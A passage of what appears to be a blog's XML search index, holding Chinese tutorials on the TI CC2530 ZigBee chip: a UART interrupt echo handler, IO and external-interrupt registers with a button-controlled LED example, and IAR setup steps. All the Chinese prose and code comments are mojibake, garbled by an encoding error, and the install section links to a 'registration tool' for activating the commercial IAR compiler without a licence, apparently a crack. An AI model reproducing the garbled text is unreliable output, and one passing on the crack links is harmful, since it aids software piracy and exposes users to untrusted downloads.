class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">Cfg32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">UartCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>URX0_VECTOR</span><span class="token comment">//ä¸­æ–­æœåŠ¡å‡½æ•°</span></span>__interrupt <span class="token keyword">void</span> <span class="token function">UART0_ISR</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        URX0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//ä¸²å£0æ¥æ•°æ®çš„æ ‡å¿—ä½ï¼Œç¡¬ä»¶ä¼šç½®1ï¼Œæˆ‘ä»¬è½¯ä»¶è¦æ¸…0</span>    ch<span class="token operator">=</span>U0DBUF<span class="token punctuation">;</span><span class="token comment">//ä»æ¥å—å¯„å­˜å™¨é‡Œå–å­—èŠ‚å­˜å…¥å˜é‡ch</span>        U0DBUF<span class="token operator">=</span>ch<span class="token punctuation">;</span><span class="token comment">//æŠŠå˜é‡ché‡Œçš„å€¼èµ‹ç»™ä¸²å£0å‘é€æ•°æ®å¯„å­˜å™¨</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span>UTX0IF<span class="token punctuation">)</span><span class="token punctuation">;</span>    UTX0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOæ§åˆ¶ä¸å¤–éƒ¨ä¸­æ–­</title>
      <link href="posts/4344df18/"/>
      <url>posts/4344df18/</url>
      
        <content type="html"><![CDATA[<p>CC2530åªå…·å¤‡<a href="https://baike.baidu.com/item/QFN%E5%B0%81%E8%A3%85/5168878?fr=aladdin">QFN</a>40å°è£… å·¥ä½œèŒƒå›´ï¼š2~3.6V(æ¨èé€‰3.3V)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-67.png" alt loading="lazy"></p><p>ä¸€å…±æœ‰21ä¸ªé€šç”¨IOå£ï¼Œå…¶ä¸­è¿™21ä¸ªåˆ†ä¸º3ç»„P0\P1\P2ï¼› å…¶ä¸­P0\P1ç»„å„8ä¸ªIOï¼ŒP2ç»„5ä¸ªï¼ˆP2_0ã€P2_1ã€ P2_2ã€P2_3ã€ P2_4ï¼‰ã€‚</p><p>è¿™äº›å£å­éƒ½å¯ä»¥ä½œä¸ºæ™®é€šæˆ–å¯¹åº”çš„ç‰‡ä¸Šå¤–è®¾æ§åˆ¶ã€‚</p><p>å…¶ä¸­P1_0 P1_1æœ‰20mAçš„è¾“å‡ºé©±åŠ¨èƒ½åŠ›ï¼Œå…¶ä½™çš„åªæœ‰4mA</p><p>PxSELã€PxDIRã€PxINP Pxï¼ˆxåˆ†åˆ«å¯¹åº”0ã€1ã€2,ç”¨æ¥æ§åˆ¶å¯¹åº”çš„IOå£ç»„ï¼‰3ç§å¯„å­˜å™¨ï¼›å¤ä½ã€é»˜è®¤éƒ½æ˜¯0</p><span id="more"></span><h1 id="PxSELå¯„å­˜å™¨"><a href="#PxSELå¯„å­˜å™¨" class="headerlink" title="PxSELå¯„å­˜å™¨"></a>PxSELå¯„å­˜å™¨</h1><p>PxSELå¯„å­˜å™¨ä½œç”¨: æœ‰8ä½ï¼Œæ¯ä¸€ä½å¯¹åº”å…·ä½“çš„IOç»„ä¸­çš„ç›¸åº”çš„ä¸€ä¸ªIOï¼Œå†³å®šå®ƒæ˜¯æ™®é€šIOå£è¿˜æ˜¯ç‰‡ä¸Šå¤–è®¾ï¼Œ0è¡¨ç¤ºæ™®é€šIOå£ï¼Œ1è¡¨ç¤ºç‰‡ä¸Šå¤–è®¾ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-68.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-69.png" alt loading="lazy"></p><h1 id="PxDIRå¯„å­˜å™¨"><a href="#PxDIRå¯„å­˜å™¨" class="headerlink" title="PxDIRå¯„å­˜å™¨"></a>PxDIRå¯„å­˜å™¨</h1><p>PxDIRå¯„å­˜å™¨ä½œç”¨: æœ‰8ä½ï¼Œæ¯ä¸€ä½å¯¹åº”å…·ä½“çš„IOç»„ä¸­çš„ç›¸åº”çš„ä¸€ä¸ªIOï¼Œå†³å®šå®ƒæ˜¯è¾“å…¥è¿˜æ˜¯è¾“å‡ºï¼Œ0è¡¨ç¤ºè¾“å…¥ï¼Œ1è¡¨ç¤ºè¾“å‡ºã€‚</p><p>ç‰¹åˆ«æ³¨æ„ï¼šå…¶ä¸­P2ç»„åªæœ‰5ä¸ªIOå£ï¼Œä½äº”ä½ä¹Ÿå¯¹åº”P2_0 â€¦ P2_4 åé¢çš„ä½ä¸ç”¨ç®¡ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-70.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-71.png" alt loading="lazy"></p><h1 id="PxINPå¯„å­˜å™¨"><a href="#PxINPå¯„å­˜å™¨" class="headerlink" title="PxINPå¯„å­˜å™¨"></a>PxINPå¯„å­˜å™¨</h1><p>PxINPå¯„å­˜å™¨ä½œç”¨: åœ¨è¾“å…¥çš„æ—¶å€™ï¼Œ8ä½ï¼Œæ¯ä¸€ä½å¯¹åº”å…·ä½“çš„IOç»„ä¸­çš„ç›¸åº”çš„ä¸€ä¸ªIOï¼Œå†³å®šå®ƒæ˜¯ä¸Šä¸‹æ‹‰æ¨¡å¼è¿˜æ˜¯ä¸‰æ€ï¼Œ0è¡¨ç¤ºä¸Šä¸‹æ‹‰æ¨¡å¼ï¼Œ1è¡¨ç¤ºä¸‰æ€ã€‚</p><p>ç‰¹åˆ«æ³¨æ„ï¼šå…¶ä¸­P2ç»„åªæœ‰5ä¸ªIOå£ï¼Œä½äº”ä½ä¹Ÿå¯¹åº”P2_0 â€¦ P2_4 ï¼Œåé¢çš„3ä½å†³å®šåœ¨é…ç½®ä¸ºä¸Šä¸‹æ‹‰æ¨¡å¼çš„æ—¶å€™ï¼Œç»„ä¸ºä¸Šæ‹‰ è¿˜æ˜¯ä¸‹æ‹‰ï¼Œ0è¡¨ç¤ºä¸Šæ‹‰ï¼Œ1è¡¨ç¤ºä¸‹æ‹‰ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-72.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-73.png" alt loading="lazy"></p><h1 id="EA"><a href="#EA" class="headerlink" title="EA"></a>EA</h1><p>æ€»CPUå¼€å…³ä¸­æ–­ï¼Œä»¤å…¶ä¸º1åˆ™ä¸ºå¼€å…³é—­åˆ</p><h1 id="PxIE"><a href="#PxIE" class="headerlink" title="PxIE"></a>PxIE</h1><p>ç»„ä½¿èƒ½ä½ï¼Œæ§åˆ¶PxIEN</p><p>æ³¨æ„ï¼šå¯ä»¥ç›´æ¥ä»¤P0IE=1ï¼Œè‹¥è¦è®¾ç½®P1IEä¸º1ï¼Œåˆ™ä»¤IEN2 |=0x10ï¼›ç›¸å½“äºP1IE=1</p><h1 id="PxIEN"><a href="#PxIEN" class="headerlink" title="PxIEN"></a>PxIEN</h1><p>å¯¹åº”çš„ä¸­æ–­ä½¿èƒ½æ ‡å¿—ä½ï¼Œä½¿ç”¨æ–¹æ³•ï¼šPxIEN |= 0x__ï¼›ä¸º1åˆ™ä¸ºé—­åˆ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-74.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-75.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-76.png" alt loading="lazy"></p><h1 id="PICTLå¯„å­˜å™¨"><a href="#PICTLå¯„å­˜å™¨" class="headerlink" title="PICTLå¯„å­˜å™¨"></a>PICTLå¯„å­˜å™¨</h1><p>0ä»£è¡¨ä¸Šå‡æ²¿ï¼Œ1ä»£è¡¨ä¸‹é™æ²¿ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-77.png" alt loading="lazy"></p><h1 id="PxIFG"><a href="#PxIFG" class="headerlink" title="PxIFG"></a>PxIFG</h1><p>ä¸­æ–­çŠ¶æ€æ ‡å¿—å¯„å­˜å™¨, å½“å‘ç”Ÿä¸­æ–­æ—¶ï¼Œç›¸åº”ä½å°†è¢«ç½®1</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-79.png" alt loading="lazy"></p><h1 id="ä¸­æ–­å‡½æ•°"><a href="#ä¸­æ–­å‡½æ•°" class="headerlink" title="ä¸­æ–­å‡½æ•°"></a>ä¸­æ–­å‡½æ•°</h1><p>pragma vector=PxINT_VECTORï¼ˆx=0,1,2ï¼‰</p><pre class="language-c" data-language="c"><code class="language-c">pragma vector<span class="token operator">=</span>PxINT_VECTORï¼ˆx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>ï¼‰__interrupt  <span class="token keyword">void</span>  <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>PxIFG<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> PxIF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å‡½æ•°æœ€åéœ€è¦å°†PxIFGå’ŒPxIFæ¸…é›¶ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-78.png" alt loading="lazy"></p><p>æœ€åé™„ä¸Šä¸€æ®µèƒ½å¤ŸæŒ‰æŒ‰é’®æ§åˆ¶ç¯äº®ç­çš„ä»£ç </p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span><span class="token keyword">void</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>   <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>     <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">30</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   P0SEL <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0_5è®¾ç½®ä¸ºæ™®é€šIOå£</span>  P0DIR <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0_5è®¾ç½®ä¸ºè¾“å…¥</span>  P0INP <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0_5è®¾ç½®ä¸ºä¸Šä¸‹æ‹‰æ¨¡å¼</span>  P2INP <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0ç»„é…ç½®æˆä¸Šæ‹‰æ¨¡å¼</span>    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//é—­åˆæ€»CPU</span>  P0IE<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//P1IEå¦‚æœè¦è®¾ç½®ä¸º1ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç”¨P1IE=1,IEN2 |=0x10;// 0001 0000</span>  <span class="token comment">//IEN2 |=0x10;//ç›¸å½“äºP1IE=1</span>  P0IEN <span class="token operator">|=</span><span class="token number">0X20</span><span class="token punctuation">;</span><span class="token comment">// 0010 0000 è®¾ç½®3ä¸ªä¸­æ–­ä½¿èƒ½æ ‡å¿—ä½ï¼Œè®©ç›¸åº”çš„ä¸­æ–­å¼€å…³åˆä¸Š</span>    PICTL <span class="token operator">|=</span><span class="token number">0x01</span><span class="token punctuation">;</span><span class="token comment">//æŠŠP0è¿™ä¸€ç»„é…ç½®æˆä¸‹é™æ²¿è§¦å‘//PICTL |=0x02åˆ™ä¸ºæŠŠP1ç»„é…ç½®æˆä¸‹é™æ²¿</span>    P1DIR <span class="token operator">|=</span><span class="token number">0X01</span><span class="token punctuation">;</span><span class="token comment">//é…ç½®P1_0ä½è¾“å‡º</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­»å¾ªç¯ï¼Œä¸ç»“æŸå‡½æ•°</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">optimize<span class="token operator">=</span>none</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>P0INT_VECTOR</span></span>__interrupt <span class="token keyword">void</span> <span class="token function">fsdfas</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>P0IFG <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">// 0010 0000</span>    <span class="token punctuation">&#123;</span><span class="token comment">//P0ç»„çš„ç¬¬5ä½ P0_5å¼•å‘äº†å¤–éƒ¨ä¸­æ–­</span>        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span>P0_5<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//è¯´æ˜ç¡®å®æ˜¯è¿æ¥åœ¨P0_5çš„æŒ‰é’®è§¦å‘äº†å¤–éƒ¨ä¸­æ–­</span>           P1_0 <span class="token operator">^=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//å¼‚æˆ–æ“ä½œ</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    P0IFG<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>     P0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBeeå…¥é—¨</title>
      <link href="posts/1dea566/"/>
      <url>posts/1dea566/</url>
      
        <content type="html"><![CDATA[<ul><li>å­¦ä¹ ZigBeeä¸ä»…ä»…æ˜¯å­¦ä¹ æ§åˆ¶å™¨æœ¬èº«ï¼Œè¿˜è¦æŒæ¡ä¸€å †å«åšåè®®æ ˆçš„ä»£ç å’Œç½‘ç»œçš„ä¸€äº›ç›¸å…³ä¸œè¥¿</li></ul><p>ZigBeeæ˜¯æ— çº¿è®¾å¤‡ä¹‹é—´çš„ä¸€ç§é€šä¿¡æ–¹å¼ï¼Œç±»ä¼¼äºä»»äººå’Œäººä¹‹é—´çš„æ™®é€šè¯äº¤æµï¼Œæ™®é€šè¯å°±æ˜¯ä¸€ç§é€šä¿¡æ–¹å¼</p><p>ZigBeeï¼ŒZigBeeé€šä¿¡æ–¹å¼ï¼ŒZigBeeåè®®è¿™ä¸‰è€…æ²¡ä»»ä½•åŒºåˆ«ï¼Œåªæ˜¯è¯´æ³•ä¸åŒè€Œå·²</p><p>ZigBeeçš„ä½œç”¨å°±æ˜¯ç”¨äºæ— çº¿æ¨¡å—å’Œæ¨¡å—ä¹‹é—´çš„é€šä¿¡ï¼Œæ„å»ºæ— çº¿å±€åŸŸç½‘</p><p>æ— çº¿ä¼ æ„Ÿç½‘ç»œï¼šå¦‚æœè¿™ä¸ªæ— çº¿å±€åŸŸç½‘ç”¨äºä¼ æ„Ÿå™¨çš„æ•°æ®æ”¶é›†å’Œç›‘æ§ï¼Œé‚£ä¹ˆè¿™ä¸ªç½‘ç»œå°±å«åšæ— çº¿ä¼ æ„Ÿå™¨ç½‘ç»œï¼Œæ˜¯æ— çº¿å±€åŸŸç½‘çš„ä¸€ç§å…·ä½“åº”ç”¨</p><p>å¼•å…¥ZigBeeé€šä¿¡æ–¹å¼çš„åŸå› ï¼š</p><ul><li>WiFiï¼šé€šä¿¡é€Ÿç‡å¤§ï¼ŒåŠŸè€—å¤§ç­‰</li><li>è“ç‰™ï¼šåŠŸè€—å°ï¼Œç»„ç½‘çš„èŠ‚ç‚¹æ•°è¾ƒå°‘</li><li>ZigBeeï¼šå¯ä»¥ç»„ä»¶å¤§è§„æ¨¡çš„ç½‘ç»œï¼ŒåŠŸè€—ä½ï¼ˆTI CC2530 æ­£å¸¸å·¥ä½œç”µæµ8mAï¼Œæœ€ä½å·¥ä½œè¾¾åˆ°å‡ ä¸ªuAï¼‰ï¼Œç¼ºç‚¹ä¸ºé€šä¿¡é€Ÿç‡å°ï¼ŒMAX=250KB</li></ul><p>æ­¤æ¬¡ä½¿ç”¨çš„æ˜¯CC2530èŠ¯ç‰‡</p><span id="more"></span><h1 id="ç¯å¢ƒçš„å®‰è£…å’Œæ­å»º"><a href="#ç¯å¢ƒçš„å®‰è£…å’Œæ­å»º" class="headerlink" title="ç¯å¢ƒçš„å®‰è£…å’Œæ­å»º"></a>ç¯å¢ƒçš„å®‰è£…å’Œæ­å»º</h1><p>å·¥ä½œç¯å¢ƒIARçš„å®‰è£…ï¼š</p><p><a href="https://pan.baidu.com/s/1YvVTsz7ZBu1c3FSTDQVjVA">ä¸‹è½½é“¾æ¥</a>ï¼Œæå–ç ï¼švbzy</p><p>ä½¿ç”¨æ³¨å†Œå·¥å…·æ¿€æ´»ï¼š</p><p><a href="https://pan.baidu.com/s/1iCz3AGJwQPoXLJ5Uf5rHwQ">ä¸‹è½½é“¾æ¥</a>ï¼Œæå–ç ï¼š2c5p</p><p>æ³¨æ„ï¼šWin7ä»¥ä¸Šçš„ç³»ç»Ÿæ¿€æ´»çš„æ—¶å€™éœ€è¦å³é”®ä»¥ç®¡ç†å‘˜æ–¹å¼è¿è¡Œè½¯ä»¶ï¼Œå¦åˆ™ä¼šåœ¨åé¢çš„ç¼–è¯‘ä»£ç çš„è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œ<a href="https://zhidao.baidu.com/question/447439875.html">è¯¦è§é“¾æ¥</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/u83GDwMvLFlJB2W.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/aJf8yK4ZkPORcSX.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/IrqQgWvn1JaZCz7.png" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºæ¿€æ´»æ“ä½œï¼Œå…¶ä½™æ“ä½œåªéœ€nextå³å¯</p><h1 id="æ–°å»ºå·¥ç¨‹æ–‡ä»¶"><a href="#æ–°å»ºå·¥ç¨‹æ–‡ä»¶" class="headerlink" title="æ–°å»ºå·¥ç¨‹æ–‡ä»¶"></a>æ–°å»ºå·¥ç¨‹æ–‡ä»¶</h1><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/YM1nrkzWNiZh3KL.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/hKd4nOpzQ8c6DqH.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/M7zojwX6V3TRxg9.png" loading="lazy"><p>Cè¯­è¨€.cæ–‡ä»¶å»ºç«‹ä¸ä¿å­˜</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/2yUOpqJR5MWLecm.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/P5ECVbMHxGUvI69.png" loading="lazy"><p>å°†æ–‡ä»¶æ·»åŠ åˆ°å·¥ç¨‹ä¸­ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/Er96gzcCAYIORKk.png" loading="lazy"><p>å†™å…¥ä»£ç ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iocc2530.h></span></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  P1DIR <span class="token operator">|=</span><span class="token number">0X01</span><span class="token punctuation">;</span><span class="token comment">//è®©P_0ä¸ºè¾“å‡º</span>  P1_0<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//0ä¸ºä½ç”µå¹³ï¼Œä½¿äºŒæç®¡å‘å…‰ï¼Œ1ä¸ºé«˜ç”µå¹³</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/htJEQRjI3Dfepy4.png" loading="lazy"><p>ç‚¹å‡»ç¼–è¯‘ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/RmyKXTsE79GHuOl.png" loading="lazy"><p>åœ¨å¼¹å‡ºçš„æ¡†æ¡†ä¸­ç»™å·¥ç¨‹å·¥ä½œç©ºé—´å‘½åï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/j3tPOgkvs1MpoEr.png" loading="lazy"><p>ä¿å­˜ï¼Œç¼–è¯‘é€šè¿‡</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/b8COxYTdSlU5sIV.png" loading="lazy"><p>ä»¥ä¸‹ä¸ºå·¥ç¨‹ç›®å½•ä¸­å„æ–‡ä»¶çš„ä»‹ç»ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/JzwFsD25EGR9S4C.png" loading="lazy"><h1 id="ZigBeeä»¿çœŸå™¨"><a href="#ZigBeeä»¿çœŸå™¨" class="headerlink" title="ZigBeeä»¿çœŸå™¨"></a>ZigBeeä»¿çœŸå™¨</h1><p>ä»¿çœŸä¸ä¸‹è½½ç¨‹åºç”¨åˆ°çš„ä¸€ç§ç¡¬ä»¶</p><p>éœ€å•Šåœ¨Windowsç¯å¢ƒä¸‹å®‰è£…é©±åŠ¨æ‰å¯ä»¥ä½¿ç”¨</p><p><a href="https://pan.baidu.com/s/1cM9o3uMKPdgISDyFvodyMg">é©±åŠ¨ä¸‹è½½é“¾æ¥</a>ï¼Œæå–ç ï¼š3gbw</p><p>åœ¨ç”µè„‘USBç«¯å£æ’ä¸Šä»¿çœŸå™¨ï¼Œæ‰“å¼€è®¾å¤‡ç®¡ç†å™¨ï¼Œå³é”®æ–°åŠ è¿›æ¥çš„å‰é¢æœ‰é»„è‰²æ„Ÿå¹å·çš„æ ‡è‡´ï¼Œç‚¹å‡»æ›´æ–°é©±åŠ¨</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/uCKOXfbs7zI5GaM.png" loading="lazy"><p>ç‚¹å‡»æµè§ˆå®šä½åˆ°é©±åŠ¨æ–‡ä»¶å¤¹ï¼Œéšåä¸‹ä¸€æ­¥å®‰è£…å³å¯</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/WafLPxBkTDVo4vM.png" loading="lazy"><p>éšåè¿›è¡Œä¸‹è½½æ“ä½œï¼ˆå³å°†ç¨‹åºä¸‹è½½åˆ°æ¿å­é‡Œï¼‰</p><h1 id="ä¸‹è½½å‰çš„é…ç½®æ“ä½œ"><a href="#ä¸‹è½½å‰çš„é…ç½®æ“ä½œ" class="headerlink" title="ä¸‹è½½å‰çš„é…ç½®æ“ä½œ"></a>ä¸‹è½½å‰çš„é…ç½®æ“ä½œ</h1><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/ANBYtOsRPDoSCHQ.png" loading="lazy"><p>å™¨ä»¶é€‰æ‹©ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/yMp4BiOlKfHmPq3.png" loading="lazy"><p>ç‚¹å‡»åå¼¹å‡ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ­¤æ–‡ä»¶å¤¹åœ¨IARè½¯ä»¶çš„å®‰è£…ç›®å½•ä¸‹</p><p>é€‰æ‹©â€“&gt;Texas Instrumentsâ€“&gt;CC2530F256ï¼Œæ‰“å¼€å³å¯</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/k8Cwd32T9RKJlWy.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/OaqwEvyUFskYjpV.png" loading="lazy"><p>Linkerè¿æ¥é…ç½®ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/M8GDpaRTysNzZhE.png" loading="lazy"><p>Debuggeré€‰æ‹©ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/i9jpoArZXJbNlcU.png" loading="lazy"><p>ç‚¹å‡»OKåå³å¯ä¸‹è½½åˆ°æ¿å­ä¸­</p><p>ç‚¹å‡»é¡ºåºå¦‚ä¸‹ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/yUYRqJVPsxOf97B.png" loading="lazy"><p>ä»¥ä¸‹ä¸ºå„ä¸ªå›¾æ ‡æ‰€ä»£è¡¨çš„å«ä¹‰ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/YH5QhtF6EwV7AS3.png" loading="lazy"><h1 id="å¯¼å‡ºä¸ºHexé•œåƒæ–‡ä»¶ä¾›ä»–äººä½¿ç”¨"><a href="#å¯¼å‡ºä¸ºHexé•œåƒæ–‡ä»¶ä¾›ä»–äººä½¿ç”¨" class="headerlink" title="å¯¼å‡ºä¸ºHexé•œåƒæ–‡ä»¶ä¾›ä»–äººä½¿ç”¨"></a>å¯¼å‡ºä¸ºHexé•œåƒæ–‡ä»¶ä¾›ä»–äººä½¿ç”¨</h1><p>éœ€è¦ç”¨åˆ°SmartRF flash programmerè¿™æ¬¾è½¯ä»¶</p><p><a href="https://pan.baidu.com/s/1TyV7qdPfyicisiA6sISpzg">ä¸‹è½½é“¾æ¥</a>ï¼Œæå–ç 